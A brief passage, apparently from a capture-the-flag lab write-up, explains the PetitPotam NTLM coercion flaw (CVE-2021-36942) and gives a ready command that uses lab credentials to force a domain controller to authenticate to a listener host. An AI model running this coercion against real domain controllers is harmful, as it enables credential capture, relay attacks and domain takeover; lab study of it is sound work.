PetitPotam ( CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August
of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to
authenticate against another host using NTLM over port 445 via the Local Security Authority
Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol
(MS-EFSRPC).

```bash
python3 PetitPotam.py -pipe all -u john.w -p 'RFulUtONCOL!' -d darkzero.htb 10.10.16.39 10.10.11.89

# 10.10.16.39 -> listner
# 10.10.11.89 -> target
```